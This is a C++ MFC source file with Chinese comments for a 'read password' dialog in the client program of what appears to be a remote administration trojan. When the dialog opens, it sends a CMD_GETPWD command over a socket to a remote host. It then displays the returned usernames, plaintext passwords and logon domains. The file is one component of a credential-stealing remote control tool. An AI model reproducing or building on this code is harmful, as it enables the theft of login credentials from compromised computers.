// ReadPswDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Client.h"
#include "ReadPswDlg.h"
#include "SystemManager.h"

// CReadPswDlg 对话框

IMPLEMENT_DYNAMIC(CReadPswDlg, CDialog)

CReadPswDlg::CReadPswDlg(CWnd* pParent /*=NULL*/, SOCKET sock)
	: CDialog(CReadPswDlg::IDD, pParent)
{
	m_pWndMsg = pParent;
	m_socket = sock;
	m_strContent = _T("");
}

CReadPswDlg::~CReadPswDlg()
{
}

void CReadPswDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_READ_PSW, m_editCtrl);
}


BEGIN_MESSAGE_MAP(CReadPswDlg, CDialog)
	ON_BN_CLICKED(IDC_BTN_GETPSW, &CReadPswDlg::OnBnClickedBtnGetpsw)
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CReadPswDlg 消息处理程序
BOOL CReadPswDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //如果按下的是回车键或ESC键，则截断消息
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CReadPswDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	DlgInit();
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CReadPswDlg::DlgInit()
{
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_GETPWD;   //帐号密码查看
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
	CString strLeft = _T("就绪");
	CString strRight = _T("");
	::SendMessage( ((CSystemManager*)this->m_pWndMsg)->m_sysStatusBar, SB_SETTEXT, (WPARAM)0, (LPARAM)strLeft.GetBuffer(0));
	::SendMessage( ((CSystemManager*)this->m_pWndMsg)->m_sysStatusBar, SB_SETTEXT, (WPARAM)1, (LPARAM)strRight.GetBuffer(1));	
}

void CReadPswDlg::OnBnClickedBtnGetpsw()
{
	// TODO: 在此添加控件通知处理程序代码
}

void CReadPswDlg::SetReadPswInfo(IN READPSWDATA_C tagRPDATA)
{
	CString strUserName = _T("");
	strUserName.Format(_T("UserName: %s\r\n"), tagRPDATA.szUserName);
	m_strContent += strUserName;
	CString strUserPwd = _T("");
	strUserPwd.Format(_T("password: %s\r\n"), tagRPDATA.szUserPwd);
		m_strContent += strUserPwd;
	CString strDomain = _T("");
	strDomain.Format(_T("LogonDomain: %s\r\n"), tagRPDATA.szDomain);
	m_strContent += strDomain;
	CString strError = _T("");
	strError.Format(_T("%s\r\n"), tagRPDATA.szErrorMsg);
	m_strContent += strError;
	m_strContent += _T("\r\n");
    
	m_editCtrl.SetWindowText(m_strContent);
}

HBRUSH CReadPswDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  在此更改 DC 的任何属性
	if (IDC_STATIC_READPSW == pWnd->GetDlgCtrlID() && CTLCOLOR_STATIC == nCtlColor)
	{
		pDC->SetTextColor(RGB(255,0,0));   //字体颜色
		pDC->SetBkMode(TRANSPARENT);
	}
	// TODO:  如果默认的不是所需画笔，则返回另一个画笔
	return hbr;
}


void CReadPswDlg::OnCancel()
{
	// TODO: 在此添加专用代码和/或调用基类
	DestroyWindow();
	delete this;
}

void CReadPswDlg::PostNcDestroy()
{
	// TODO: 在此添加专用代码和/或调用基类
	((CSystemManager*)this->m_pParentWnd)->m_pReadPswSlg = NULL; 
	CDialog::PostNcDestroy();
}
